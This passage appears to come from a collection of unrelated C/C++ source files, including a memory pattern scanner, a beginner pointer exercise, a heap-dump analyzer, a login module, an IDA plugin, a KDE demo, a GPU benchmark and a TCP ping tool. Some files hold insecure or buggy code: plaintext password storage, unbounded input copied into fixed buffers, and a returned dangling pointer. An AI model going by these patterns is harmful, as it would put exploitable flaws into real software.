mask))\n\t\t\t\t{\n\t\t\t\t\treturn (uint8_t *)start;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\telse\n\t\t{\n\t\t\tfor (; start >= end; --start)\n\t\t\t{\n\t\t\t\tif (compare_reverse((char*)start, (char*)aob, mask))\n\t\t\t\t{\n\t\t\t\t\treturn (uint8_t *)start - strlen(mask) - 1;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\treturn 0;\n\t};\n\n\tuint8_t *scan(const char *module, const char *aob, const char *mask)\n\t{\n\t\tMODULEINFO info;\n\t\tif (GetModuleInformation(GetCurrentProcess(), GetModuleHandle(module), &info, sizeof(info)))\n\t\t\treturn scan(aob, mask, (uintptr_t)info.lpBaseOfDll, (uintptr_t)info.lpBaseOfDll + info.SizeOfImage);\n\n\t\treturn 0;\n\t}\n}",
    "\ufeff// DAY1.cpp : This file contains the 'main' function. Program execution begins and ends there.\n//\n\n#include <iostream>\n#include <stdio.h>\nusing namespace std;\n\nint tinh_tong(int a, int b) {\n    int s = a + b;\n    return 0;\n}\n\nint* tinh_tong_2(int a, int b) {\n    int sum = a + b;\n    int* p = &sum;\n    return p;\n}\n\nstruct ImgSize\n{\n    int w; \n    int h;\n    int depth;\n\n    ~ImgSize() {\n        std::cout << \"Calling Destructor of class ImgSize\\n\";\n    }\n};\nclass Img {\n    public:\n        int w;\n        int h;\n        int depth;\n        ImgSize*  imgSize =new ImgSize();\n    private:\n        \n        \n        int* p = &depth;\n    public:\n        \n        // Overloading Constructor\n        Img() {\n            std::cout << \"Calling Constructor 0 of class Img\\n\";\n            w = 0;\n            h = 0;\n            depth = 1;\n        };\n        Img(int _w, int _h) {\n            std::cout << \"Calling Constructor 1 of class Img\\n\";\n            imgSize->w = _w;\n            imgSize->h = _h;\n            imgSize->depth= 1;\n\n            w = _w;\n            h = _h;\n            depth = 1;\n        };\n        Img(int _w, int _h, int _depth) {\n            std::cout << \"Calling Constructor 2 of class Img\\n\";\n            w = _w;\n            h = _h;\n            depth = _depth;\n            imgSize->w = _w;\n            imgSize->h = _w;\n\n            imgSize->depth = _depth;\n        };\n\n        // Destructor\n        ~Img() {\n            std::cout << \"Calling Destructor of class Img\\n\";\n            delete imgSize;\n        }\n};\n\nint main()\n{\n    int a = 10;\n    \n    //std::cout << \"Tong a va b \" << tinh_tong(100, 200) << std::endl;\n    if (tinh_tong(100, 200)) {\n        std::cout << \"True\" << std::endl;\n    }\n    else {\n        std::cout << \"False\" << std::endl;\n    }\n\n    // Pointer\n    int* p = &a;\n    std::cout << \"Gia tri cua p \" << p << std::endl;\n    std::cout << \"Gia tri cua dia chi ma con tro p tro toi \" << *p << std::endl;\n    std::cout << \"Gia tri cua a \" << a << std::endl;\n\n    (*p) = 100;\n    std::cout << \"Gia tri cua dia chi ma con tro p tro toi \" << *p << std::endl;\n    std::cout << \"Gia tri cua a \" << a << std::endl;\n\n    // Con tro ham \n    int* s = tinh_tong_2(100, 500);\n    std:cout << \"Dia chi cua s la \" << s << std::endl;\n\n    // Delete s (Thu hoi lai vung nho ma con tro s dang tham chieu toi)\n    //delete p;\n    s = nullptr;\n    // cout gia tri cua s\n    std::cout << \"Dia chi cua s la \" << s << std::endl;\n    // set s=nullptr\n\n    // cout gia tri cua s \n\n    //\n    int** q = (&p);\n    (**q) = 200;\n    std::cout << \"Gia tri cua a \" << a << std::endl;\n    std::cout << \"Gia tri cua dia chi ma con tro p tro toi \" << *p << std::endl;\n    std::cout << \"Gia tri cua dia chi cua dia chi ma con tro q tham chieu toi \" << **q << std::endl;\n\n    // Tao object img tu class Img (Dynamic Allocate)\n    Img* img = new Img(100, 400, 3);\n    std::cout << \"Chieu dai cua anh la: \" << img->w << std::endl;\n    std::cout << \"Chieu rong cua anh la: \" << img->h << std::endl;\n\n    // Tao object img tu class Img (Static Allocate)\n    {\n        Img img2(100, 400, 3);\n        //std::cout << \"Chieu cao cua anh la: \" << img2.h << std::endl;\n        //std::cout << \"Chieu rong cua anh la: \" << img2.w << std::endl;\n        std::cout << \"Chieu cao cua anh la: \" << img2.imgSize->w << std::endl;\n        std::cout << \"Hello World!\\n\";\n    }\n    delete img;\n    /*\n    * Con tr\u1ecf p kh\u00f4ng delete \u0111\u01b0\u1ee3c v\u00ec n\u00f3 kh\u00f4ng \u0111\u01b0\u1ee3c kh\u1edfi t\u1ea1o b\u1eb1ng new (c\u1ea5p ph\u00e1t \u0111\u1ed9ng)\n    */\n\n\n    /*\n    * H\u00e0m con tr\u1ecf l\u00e0 h\u00e0m tr\u1ea3 v\u1ec1 m\u1ed9t con tr\u1ecf\n    * Con tr\u1ecf h\u00e0m l\u00e0 con tr\u1ecf, tr\u1ecf t\u1edbi m\u1ed9t h\u00e0m\n    */\n    std::cout << \"Program paussing ...\";\n}\n\n// Run program: Ctrl + F5 or Debug > Start Without Debugging menu\n// Debug program: F5 or Debug > Start Debugging menu\n\n// Tips for Getting Started: \n//   1. Use the Solution Explorer window to add/manage files\n//   2. Use the Team Explorer window to connect to source control\n//   3. Use the Output window to see build output and other messages\n//   4. Use the Error List window to view errors\n//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project\n//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file\n",
    "#include <iostream>\n#include <memory>\n#include <algorithm>\n\n#include \"args.h\"\n#include \"io/file.h\"\n#include \"hprof/hprof_io.h\"\n#include \"generation/generation_analyzer.h\"\n#include \"output/hprof_data_print.h\"\n\nusing hprof_analyzer::read_file, std::make_unique, hprof_analyzer::generation_t, hprof_analyzer::args_t,\n    hprof_analyzer::parse_args,\n    std::unique_ptr, std::string;\n\nint main(int argc, char *argv[]) {\n  const args_t &args = parse_args(argc, argv);\n  const hprof_analyzer::content_t &hprof = read_file(*args.heap_dump);\n  unsigned char *ptr = hprof.buffer.get();\n  const hprof_analyzer::content_t &log_file = read_file(*args.log);\n  auto regions = hprof_analyzer::parse_hear_region_info(reinterpret_cast<char *>(log_file.buffer.get()));\n  auto hprof_data = hprof_analyzer::read(ptr, *regions);\n  std::unordered_map<int64_t, hprof_analyzer::stats_t> stats;\n  for (auto &item : *hprof_data->get_instances()) {\n    auto &instance = item.second;\n    if (item.second.region_type == hprof_analyzer::generation_t::OLD && item.second.live) {\n      if (stats.contains(instance.class_id)) {\n        stats[instance.class_id].own_size += instance.own_size;\n        stats[instance.class_id].outgoing_size += instance.outgoing_size;\n        stats[instance.class_id].total_size =\n            stats[instance.class_id].own_size + stats[instance.class_id].outgoing_size;\n      } else {\n        stats[instance.class_id] =\n            {instance.class_id, instance.own_size, instance.outgoing_size, instance.own_size + instance.outgoing_size};\n      }\n    }\n  }\n  std::vector<hprof_analyzer::stats_t> stats_vector;\n  stats_vector.reserve(stats.size());\n  for (auto &item : stats) {\n    stats_vector.push_back(item.second);\n  }\n  std::sort(stats_vector.begin(),\n            stats_vector.end(),\n            [](const hprof_analyzer::stats_t &a, const hprof_analyzer::stats_t &b) {\n              return a.total_size > b.total_size;\n            });\n  hprof_analyzer::print_hprof(stats_vector, hprof_data.get());\n  return 0;\n}\n",
    "#include \"loginData.hpp\"\n#include <iostream>\n#include <fstream>\n#include <vector>\n\nusing std::cout;\nusing std::cin;\nusing std::endl;\nusing std::fstream;\nusing std::vector;\nloginData::loginData()\n{\n}\n\nloginData::~loginData()\n{\n}\n\nint loginData::login()\n{\n    readUsername();\n    readPassword();\n    //readScore();\n    \n    cout << \"Username : \";\n    cin >> username;\n    cout << \"Password : \";\n    cin >> password;\n    \n    int vecSize = usernameSignin.size();\n    for (int i = 0; i < vecSize; i++)\n    {\n        if((username == usernameSignin[i]) and (password == passwordSignin[i]))\n        {\n            cout << \"Login Successfull at index : \" << i << endl;\n            accountIndex = i;\n            loginStatus = true;\n            return(0);\n        }\n    }\n    cout << \"Login Failed .. \" << endl;\n    return 0;\n}\n\nvoid loginData::signin()\n{\n    cout << \"Make a new account \\n\";\n    cout << \"Username : \";\n    cin >> username;\n    cout << \"Password : \";\n    cin >> password;\n    fstream userSignIn;\n    \n    userSignIn.open(fname, fstream::app);\n    userSignIn << username << delimiter << password << delimiter << score << delimiter;\n    userSignIn << \"\\n\";\n    userSignIn.close();\n}\n\nvoid loginData::readUsername()\n{\n    fstream readFile(fname);\n    string data;\n    \n    size_t pos = 0;\n    string token;\n    while(getline(readFile, data))\n    {\n        while((pos = data.find(delimiter)) != string::npos)\n        {\n            token = data.substr(0, pos);\n            usernameSignin.push_back(token);\n            data.erase(0, data.length());\n        }\n    }\n}\n\nvoid loginData::readPassword()\n{\n    fstream readFile(fname);\n    string data;\n    \n    size_t pos = 0;\n    string token;\n    while(getline(readFile, data))\n    {\n        while((pos = data.find(delimiter)) != string::npos)\n        {\n            data.erase(0, pos + delimiter.length());\n            pos = data.find(delimiter);\n            \n            token = data.substr(0, pos);\n            passwordSignin.push_back(token);\n            data.erase(0, data.length());\n        }\n    }\n}\n\nvoid loginData::readScore()\n{\n    fstream readFile(fname);\n    string data;\n    \n    size_t pos = 0;\n    string token;\n    while(getline(readFile, data))\n    {\n        while((pos = data.find(delimiter)) != string::npos)\n        {\n            for (int i = 0; i < 2; i++)\n            {\n                data.erase(0, pos + delimiter.length());\n                pos = data.find(delimiter);\n            }\n            \n            token = data.substr(0, pos);\n            scoreSignin.push_back(token);\n            data.erase(0, data.length());\n            \n        }\n    }\n}\n\nvoid loginData::updateScore(vector<string> score)\n{\n    std::ofstream readFile;\n    \n    readUsername();\n    readPassword();\n    \n    readFile.open(fname);\n    \n    int row = usernameSignin.size();\n    for(int i = 0; i < row; i++)\n    {\n        readFile << usernameSignin[i] << delimiter << passwordSignin[i] << delimiter << score[i] << delimiter << '\\n';\n    }\n    readFile.close();\n}",
    "#include <iostream>\n#include<ctime>\n//#include<string>\ntypedef std::string shortcut_t;//giving std::string data type name to shortcut_t\ntypedef int integer;\nnamespace first{\n\ninteger num=21;\nshortcut_t name=\" goat samanta\";\n}//:: is called scope operator\nnamespace second{\ninteger num=10;\n\nshortcut_t  name=\" sayan samanta\";\n}//:: is called scope operator\n\nint main() {\n    clock_t start_time=clock();\n    using std::cout;\n    //using std ::string;\n    using std::endl;\n        \n        \n        \n    first:: name=\"apple\";//modifying variable \"name\" inside first namespace \n    second::name=\"ballon\";//modifying variable \"name\" inside second namespace \n     cout<< first::name<<endl;\n     \n     cout<< second::name<<endl;\n     \n     cout<< first::num<<endl;\n     \n     cout<< second::num<<endl;\n     \n     \n    clock_t end_time=clock();\n\ndouble long timespend=((double long )(end_time-start_time))/\nCLOCKS_PER_SEC*1e6;\n     cout<<\"time to run the code:\"<<( timespend)<<\"microsecond\"<<std::endl;\n    return 0;\n}",
    "/*\n    Copyright \u00a9 2017-2024 AO Kaspersky Lab\n\n    This program is free software: you can redistribute it and/or modify\n    it under the terms of the GNU General Public License as published by\n    the Free Software Foundation, either version 3 of the License, or\n    (at your option) any later version.\n\n    This program is distributed in the hope that it will be useful,\n    but WITHOUT ANY WARRANTY; without even the implied warranty of\n    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n    GNU General Public License for more details.\n\n    You should have received a copy of the GNU General Public License\n    along with this program.  If not, see <https://www.gnu.org/licenses/>.\n\n    Author: Sergey.Belov at kaspersky.com\n*/\n\n#include \"warn_off.h\"\n#include <hexrays.hpp>\n#include <diskio.hpp>\n#include <enum.hpp>\n#include \"warn_on.h\"\n\n#include \"helpers.h\"\n#include \"lit.h\"\n#include \"rename.h\"\n\n/* Format of literal database is simple:\n; 1) 'FunctionName' or STRUCT 'StructName' in line begginning (no spaces or tabs before)\n; 2) <space> [FuncArgumentNumber | StructFieldName] <space> [Type] : Where FuncArgumentNumber started from 1. 0 means return value. Type is 'enum' for exclusive values or 'bits' for values may be combined with bitwise OR\n; 3) <space> <space> [LiteralName] <space> [Value]\n;    .....\n; 4) empty line\n */\n\ntypedef std::map<uint64, qstring> literals_t; // value to literal name map\n\nstruct ida_local lit_arg_t\n{\n\tuint32 n; // number of this argument for function\n\tbool  exclusive;\n\tliterals_t refs;\n};\ntypedef qvector<lit_arg_t> lit_args_t;\ntypedef std::map<qstring, lit_args_t> lit_funcs_t;\ntypedef lit_funcs_t::const_iterator lit_func_t;\n\nstruct ida_local lit_field_t\n{\n\tqstring name;\n\tbool  exclusive;\n\tliterals_t refs;\n};\ntypedef qvector<lit_field_t> lit_fields_t;\ntypedef std::map<qstring, lit_fields_t> lit_structs_t;\ntypedef lit_structs_t::const_iterator lit_struct_t;\n\nclass ida_local literal_db\n{\n\tlit_funcs_t m_functions;\n\tlit_structs_t m_structures;\n\npublic:\n\n\tlit_func_t find_func(const char* funcname) const {\n\t\treturn m_functions.find(funcname); \n\t}\n\tbool is_func(const lit_func_t& f) const { \n\t\treturn f != m_functions.end(); \n\t}\n\tconst lit_arg_t* find_arg (const lit_func_t& lfunc, uint32 argN) const\n\t{\n\t\tfor(size_t i = 0; i < lfunc->second.size(); i++)\n\t\t\tif (lfunc->second[i].n == argN)\n\t\t\t\treturn &lfunc->second[i];\n\t\treturn NULL;\n\t}\n\n\tlit_struct_t find_struct(const char* strucname) const { \n\t\treturn m_structures.find(strucname); \n\t}\n\tbool is_struct(const lit_struct_t& s) const {\n\t\treturn s != m_structures.end();\n\t}\n\tconst lit_field_t* find_field (const lit_struct_t& s, const char* fieldname) const\n\t{\n\t\tfor(size_t i = 0; i < s->second.size(); i++)\n\t\t\tif(s->second[i].name == fieldname)\n\t\t\t\treturn &s->second[i];\n\t\treturn NULL;\n\t}\n\n\tenum eLoadStage {\n\t\tldFuncOrStruc,\n\t\tldArg,\n\t\tldFld,\n\t\tldLit\n\t};\n\n\tvoid ll_error(uint32 line, const char* s)\n\t{\n\t\tmsg(\"[hrt] literal loading error on line %d: %s\\n\", line, s);\n\t}\n\n\tbool load(linput_t* file)\n\t{\n\t\tchar buf[4096];\n\n\t\teLoadStage stage = ldFuncOrStruc;\n\t\teLoadStage aOf = stage;\n\t\tqstring funOrStruc;\n\t\tliterals_t* refs = NULL;\n\t\tuint32 line = 0;\n\t\twhile (NULL != qlgets(buf, 4096, file)) {\n\t\t\t++line;\n\t\t\t//skip comments\n\t\t\tif (buf[0] == ';')\n\t\t\t\tcontinue;\n\n\t\t\tsize_t len;\n\t\t\tdo {\n\t\t\t\tlen = qstrlen(buf);\n\t\t\t\tif (!len || (buf[len - 1] != '\\n' && buf[len - 1] != '\\r'))\n\t\t\t\t\tbreak;\n\t\t\t\tbuf[len - 1] = 0;\n\t\t\t} while (1);\n\n\t\t\tif (!len) {\n\t\t\t\tstage = ldFuncOrStruc;\n\t\t\t\tcontinue;\n\t\t\t}\n\n\t\t\t//reset stage for next arg or field after literals\n\t\t\tif (stage == ldLit && len >= 7 && buf[0] == ' ' && buf[1] != ' ')\n\t\t\t\tstage = aOf;\n\n\t\t\tswitch (stage) {\n\t\t\tcase ldFuncOrStruc:\n\t\t\t\tif (!strncmp(\"STRUCT \", buf, 7)) {\n\t\t\t\t\tfunOrStruc = &buf[7];\n\t\t\t\t\tstage = ldFld;\n\t\t\t\t} else if (buf[0] != ' ') {\n\t\t\t\t\tfunOrStruc = buf;\n\t\t\t\t\tstage = ldArg;\n\t\t\t\t\tchar last = funOrStruc.last();\n\t\t\t\t\tif(last == 'A' || last == 'W')\n\t\t\t\t\t\tll_error(line, \"Use func names without A or W in the end\");\n\t\t\t\t} else {\n\t\t\t\t\tll_error(line, \"Func or struct name expected\");\n\t\t\t\t\treturn false;\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase ldArg:\n\t\t\tcase ldFld:\n\t\t\t\tif (len >= 7 && buf[0] == ' ') {\n\t\t\t\t\tchar* sp = qstrchr(&buf[1], ' ');\n\t\t\t\t\tif (sp) {\n\t\t\t\t\t\tbool excl = false;\n\t\t\t\t\t\tif (!qstrcmp(sp + 1, \"enum\"))\n\t\t\t\t\t\t\texcl = true;\n\t\t\t\t\t\telse if (qstrcmp(sp + 1, \"bits\")) {\n\t\t\t\t\t\t\tll_error(line, \"Func arg or struct field type is not cpecified\");\n\t\t\t\t\t\t\treturn false;\n\t\t\t\t\t\t}\n\t\t\t\t\t\tif (stage == ldArg) {\n\t\t\t\t\t\t\tea_t n;\n\t\t\t\t\t\t\t*sp = 0;\n\t\t\t\t\t\t\tif (atoea(&n, buf + 1)) {\n\t\t\t\t\t\t\t\taOf = stage;\n\t\t\t\t\t\t\t\tstage = ldLit;\n\t\t\t\t\t\t\t\tlit_arg_t& a = m_functions[funOrStruc].push_back();\n\t\t\t\t\t\t\t\ta.exclusive = excl;\n\t\t\t\t\t\t\t\ta.n = (uint32)n;\n\t\t\t\t\t\t\t\trefs = &a.refs;\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\taOf = stage;\n\t\t\t\t\t\t\tstage = ldLit;\n\t\t\t\t\t\t\tlit_field_t& f = m_structures[funOrStruc].push_back();\n\t\t\t\t\t\t\tf.exclusive = excl;\n\t\t\t\t\t\t\tf.name = qstring(buf + 1, sp - buf - 1);\n\t\t\t\t\t\t\trefs = &f.refs;\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tll_error(line, \"Func a",
    "/*\n    This file is part of the KDE project\n    SPDX-FileCopyrightText: 2013 Martin Gr\u00e4\u00dflin <mgraesslin@kde.org>\n\n    SPDX-License-Identifier: LGPL-2.0-or-later\n*/\n\n#include <KActionMenu>\n#include <kcolorschememanager.h>\n#include <kcolorschememenu.h>\n\n#include <QApplication>\n#include <QDialog>\n#include <QDialogButtonBox>\n#include <QListView>\n#include <QMainWindow>\n#include <QMenu>\n#include <QMenuBar>\n#include <QToolButton>\n#include <QVBoxLayout>\n\nclass KColorSchemeDemo : public QMainWindow\n{\n    Q_OBJECT\npublic:\n    KColorSchemeDemo()\n        : QMainWindow(nullptr)\n    {\n        KColorSchemeManager *manager = new KColorSchemeManager(this);\n\n        QListView *view = new QListView(this);\n        view->setModel(manager->model());\n        connect(view, &QListView::activated, manager, &KColorSchemeManager::activateScheme);\n        manager->setAutosaveChanges(true);\n\n        QDialogButtonBox *box = new QDialogButtonBox(QDialogButtonBox::Close, this);\n        connect(box, &QDialogButtonBox::rejected, qApp, &QApplication::quit);\n\n        QToolButton *button = new QToolButton(box);\n        button->setIcon(QIcon::fromTheme(QStringLiteral(\"fill-color\")));\n        button->setMenu(KColorSchemeMenu::createMenu(manager, button)->menu());\n        box->addButton(button, QDialogButtonBox::InvalidRole);\n\n        QWidget *w = new QWidget();\n        QVBoxLayout *layout = new QVBoxLayout(w);\n        layout->addWidget(view);\n        layout->addWidget(box);\n\n        setCentralWidget(w);\n\n        QMenu *menu = new QMenu(\"Menu\", this);\n        menu->addAction(KColorSchemeMenu::createMenu(manager, this));\n        menuBar()->addMenu(menu);\n    }\n    ~KColorSchemeDemo() override\n    {\n    }\n};\n\nint main(int argc, char *argv[])\n{\n    QApplication app(argc, argv);\n\n    KColorSchemeDemo *d = new KColorSchemeDemo;\n    d->show();\n    return app.exec();\n}\n\n#include \"kcolorschemedemo.moc\"\n",
    "#include <stdio.h>\n#include <math.h>\n#include \"hip/hip_runtime.h\"\n\n/* Macro for checking GPU API return values */\n#define gpuCheck(call)                                                                          \\\ndo{                                                                                             \\\n    hipError_t gpuErr = call;                                                                   \\\n    if(hipSuccess != gpuErr){                                                                   \\\n        printf(\"GPU API Error - %s:%d: '%s'\\n\", __FILE__, __LINE__, hipGetErrorString(gpuErr)); \\\n        exit(1);                                                                                \\\n    }                                                                                           \\\n}while(0)\n\n/* --------------------------------------------------\nMatrix multiply kernel 1\n-------------------------------------------------- */\n__global__ void matrix_multiply_1(double *A, double *B, double *C, int n)\n{\n    int col = blockDim.x * blockIdx.x + threadIdx.x;\n    int row = blockDim.y * blockIdx.y + threadIdx.y;\n\n    if (col < n && row < n){\n\n        int index = n * row + col;\n        double element = 0.0;\n\n        for (int i=0; i<n; i++){\n\n            int row_index = n * row + i;\n            int col_index = n * i   + col;\n\n            element = element + A[row_index] * B[col_index]; \n        }\n\n        C[index] = element;\n    }\n}\n\n/* --------------------------------------------------\nMatrix multiply kernel 2\n-------------------------------------------------- */\n__global__ void matrix_multiply_2(double *A, double *B, double *C, int n)\n{\n    int col = blockDim.x * blockIdx.x + threadIdx.x;\n    int row = blockDim.y * blockIdx.y + threadIdx.y;\n\n    if (col < n && row < n){\n\n        int index = n * row + col;\n        double element = 0.0;\n\n        for (int i=0; i<n; i++){\n\n            int row_index = n * row + i;\n            int col_index = n * i   + col;\n\n            element = element + A[row_index] * B[col_index];\n        }\n\n        C[index] = element;\n    }\n}\n\n/* --------------------------------------------------\nMatrix multiply kernel 3\n-------------------------------------------------- */\n__global__ void matrix_multiply_3(double *A, double *B, double *C, int n)\n{\n    int col = blockDim.x * blockIdx.x + threadIdx.x;\n    int row = blockDim.y * blockIdx.y + threadIdx.y;\n\n    if (col < n && row < n){\n\n        int index = n * row + col;\n        double element = 0.0;\n\n        for (int i=0; i<n; i++){\n\n            int row_index = n * row + i;\n            int col_index = n * i   + col;\n\n            element = element + A[row_index] * B[col_index];\n        }\n\n        C[index] = element;\n    }\n}\n\n/* --------------------------------------------------\nMain program\n-------------------------------------------------- */\nint main(int argc, char *argv[]){\n\n    /* Size of NxN matrix */\n    int N = 1024;\n\n    /* Bytes in matrix in double precision */\n    size_t bytes = N * N * sizeof(double);\n\n    /* Allocate memory for host matrices 1 */\n    double *h_A_1 = (double*)malloc(bytes);\n    double *h_B_1 = (double*)malloc(bytes);\n    double *h_C_1 = (double*)malloc(bytes);\n\n    /* Allocate memory for host matrices 2 */\n    double *h_A_2 = (double*)malloc(bytes);\n    double *h_B_2 = (double*)malloc(bytes);\n    double *h_C_2 = (double*)malloc(bytes);\n\n    /* Allocate memory for host matrices 3 */\n    double *h_A_3 = (double*)malloc(bytes);\n    double *h_B_3 = (double*)malloc(bytes);\n    double *h_C_3 = (double*)malloc(bytes);\n\n    /* Initialize host arrays */\n    for(int i=0; i<N; i++){\n        for(int j=0; j<N; j++){\n\n            int index = N * i + j;\n\n            h_A_1[index] = j + 1.0;\n            h_B_1[index] = 1.0 / (i + 1.0);\n            h_C_1[index] = 0.0;\n\n            h_A_2[index] = j + 1.0;\n            h_B_2[index] = 1.0 / (i + 1.0);\n            h_C_2[index] = 0.0;\n\n            h_A_3[index] = j + 1.0;\n            h_B_3[index] = 1.0 / (i + 1.0);\n            h_C_3[index] = 0.0;\n\n        }\n    }    \n\n    hipStream_t stream1;\n    gpuCheck( hipStreamCreate(&stream1) );\n\n    hipStream_t stream2;\n    gpuCheck( hipStreamCreate(&stream2) );\n\n    hipStream_t stream3;\n    gpuCheck( hipStreamCreate(&stream3) );\n\n    /* Allocate memory for device matrices 1 */\n    double *d_A_1, *d_B_1, *d_C_1;\n    gpuCheck( hipMalloc(&d_A_1, bytes) );\n    gpuCheck( hipMalloc(&d_B_1, bytes) );\n    gpuCheck( hipMalloc(&d_C_1, bytes) );\n\n    /* Allocate memory for device matrices 2 */\n    double *d_A_2, *d_B_2, *d_C_2;\n    gpuCheck( hipMalloc(&d_A_2, bytes) );\n    gpuCheck( hipMalloc(&d_B_2, bytes) );\n    gpuCheck( hipMalloc(&d_C_2, bytes) );\n\n    /* Allocate memory for device matrices 3 */\n    double *d_A_3, *d_B_3, *d_C_3;\n    gpuCheck( hipMalloc(&d_A_3, bytes) );\n    gpuCheck( hipMalloc(&d_B_3, bytes) );\n    gpuCheck( hipMalloc(&d_C_3, bytes) );\n\n    /* Copy data from host matrices 1 to device matrices 1 */\n    gpuCheck( hipMemcpy(d_A_1, h_A_1, bytes, hip",
    "/****************************************************/\n/* 03/03 (c) Alumni, CPing class demo\t\t\t\t*/\n/* TCP Ping echo on user-defined protocols\t\t\t*/\n/****************************************************/\n#include <windows.h>\n\n#include <stdio.h>\n\n#include \"CPing.h\"\n\n#include <stdlib.h>\n\nint PrUsage(char * sPath) {\n\tprintf(\"Ping\\n\");\n\tprintf(\"Usage: %s <host> <port> <packets> [-options]\\n\", sPath);\n\tprintf(\"Options:\\n\");\n\tprintf(\"\\t-cv\\tConnective ping (default)\\n\");\n\tprintf(\"\\t-ct\\tContinuous ping\\n\");\n\tprintf(\"\\t-n\\tSpecify NOOP command\\n\");\n\tprintf(\"\\t-crlf\\tAppend CRLF to NOOP\\n\");\n\tprintf(\"\\t-t<t>\\tSpecify timeout\\n\\n\");\n\tprintf(\"Example: %s localhost 110 10 -ct -t100\", sPath);\n\treturn (0);\n}\nint main(int argc, char ** argv) {\n\tchar sBuffer[256];\n\tint iRecvd, iSent, iTotalTimeRecvd, iTotalTimeSent;\n\tint iStats[8];\n\tif(argc < 4) {\n\t\tPrUsage(argv[0]);\n\t\treturn (1);\n\t}\n\tCPing * cping = new CPing();\n\tint port = atoi(argv[2]), res;\n\tint cvping = 1, packets = atoi(argv[3]);\n\tfor(int i = 4; i < argc; i++) {\n\t\tif(!strncmp(argv[i], \"-ct\", 3)) cvping = 0;\n\t\tif(!strncmp(argv[i], \"-n\", 2)) {\n\t\t\tprintf(\"Enter valid NOOP command: \");\n\t\t\tscanf(\"%s\", sBuffer);\n\t\t\tstrcpy(cping->szNoop, sBuffer);\n\t\t}\n\t\tif(!strncmp(argv[i], \"-crlf\", 5)) strcat(cping->szNoop, \"\\r\\n\");\n\t\tif(!strncmp(argv[i], \"-t\", 2)) {\n\t\t\tfor(int j = 2; j < strlen(argv[i]); j++) sBuffer[j - 2] = argv[i][j];\n\t\t\tsBuffer[strlen(argv[i]) - 2] = 0;\n\t\t\tcping->iTimeOut = atoi(sBuffer);\n\t\t}\n\t}\n\tif(cvping) res = cping-> PingConnective(argv[1], port, packets);\n\telse res = cping->PingContinuous(argv[1], port, packets);\n\tif(res) {\n\t\tmemset(iStats, 0, sizeof(int) * 8);\n\t\tiRecvd = iSent = iTotalTimeSent = iTotalTimeRecvd = 0;\n\t\tiStats[0] = iStats[2] = iStats[4] = iStats[6] = 32768;\n\t\tif(!cping->iTotalRes) {\n\t\t\tprintf(\"No requests transmitted\");\n\t\t\treturn (0);\n\t\t}\n\t\tif(cvping) printf(\"Connective ping\\n\");\n\t\telse printf(\"Continuous ping\\n\");\n\t\tprintf(\"\\nTotal requests: %d\\nPort: %d\\n\\n\", cping->iTotalRes, port);\n\t\tfor(int i = 0; i < cping->iTotalRes; i++) {\n\t\t\tiStats[0] = ((cping->Res[i].iTimeRecv < iStats[0]) ? cping->Res[i].iTimeRecv : iStats[0]);\n\t\t\tiStats[1] = ((cping->Res[i].iTimeRecv > iStats[1]) ? cping->Res[i].iTimeRecv : iStats[1]);\n\t\t\tiStats[2] = ((cping->Res[i].iTimeSend < iStats[2]) ? cping->Res[i].iTimeSend : iStats[2]);\n\t\t\tiStats[3] = ((cping->Res[i].iTimeSend > iStats[3]) ? cping->Res[i].iTimeSend : iStats[3]);\n\t\t\tiStats[4] = ((cping->Res[i].iTotalRecvd < iStats[4]) ? cping->Res[i].iTotalRecvd : iStats[4]);\n\t\t\tiStats[5] = ((cping->Res[i].iTotalRecvd > iStats[5]) ? cping->Res[i].iTotalRecvd : iStats[5]);\n\t\t\tiStats[6] = ((cping->Res[i].iTotalSent < iStats[6]) ? cping->Res[i].iTotalSent : iStats[6]);\n\t\t\tiStats[7] = ((cping->Res[i].iTotalSent > iStats[7]) ? cping->Res[i].iTotalSent : iStats[7]);\n\t\t\tiSent += cping->Res[i].iTotalSent;\n\t\t\tiRecvd += cping->Res[i].iTotalRecvd;\n\t\t\tiTotalTimeSent += cping->Res[i].iTimeSend;\n\t\t\tiTotalTimeRecvd += cping->Res[i].iTimeRecv;\n\t\t\tprintf(\"C:%u\\tS:%u\\n\", cping->Res[i].iTimeSend, cping->Res[i].iTimeRecv);\n\t\t}\n\t\tprintf(\"\\nTotal time recvd: %5d\\tMin: %5d\\tMax: %5d\\tAvg: %5d\\n\", iTotalTimeRecvd, iStats[0], iStats[1], iTotalTimeRecvd / cping->iTotalRes);\n\t\tprintf(\"Total time sent: %5d\\tMin: %5d\\tMax: %5d\\tAvg: %5d\\n\", iTotalTimeSent, iStats[2], iStats[3], iTotalTimeSent / cping->iTotalRes);\n\t\tprintf(\"Total recvd (bytes): %5d\\tMin: %5d\\tMax: %5d\\tAvg: %5d\\n\", iRecvd, iStats[4], iStats[5], iRecvd / cping->iTotalRes);\n\t\tprintf(\"Total sent (bytes): %5d\\tMin: %5d\\tMax: %5d\\tAvg: %5d\\n\", iSent, iStats[6], iStats[7], iSent / cping->iTotalRes);\n\t} else printf(\"Error occured\\n\");\n\treturn (0);\n}",
    "/* ************************************************************************** */\n/*                                                                            */\n/*                                                        :::      ::::::::   */\n/*   FileHandler.cpp                                    :+:      :+:    :+:   */\n/*                                                    +:+ +:+         +:+     */\n/*   By: rpambhar <rpambhar@student.42.fr>          +#+  +:+       +#+        */\n/*                                                +#+#+#+#+#+   +#+           */\n/*   Created: 2024/08/01 17:19:54 by rpambhar          #+#    #+#             */\n/*   Updated: 2024/08/01 17:41:37 by rpambhar         ###   ########.fr       */\n/*                                                                            */\n/* ************************************************************************** */\n\n#include \"FileHandler.hpp\"\n\nstd::string FileHandler::readFromFile(const std::string &filename) {\n\tstd::ifstream file(filename);\n\tif (!file.is_open()) {\n\t\tthrow std::runtime_error(\"Could not open file: \" + filename);\n\t}\n\n\tstd::stringstream buffer;\n\tbuffer << file.rdbuf();\n\tfile.close();\n\treturn (buffer.str());\n}\n\nvoid FileHandler::writeToFile(const std::string &filename, const std::string &data) {\n\tstd::ofstream file(filename);\n\tif (!file.is_open()) {\n\t\tthrow 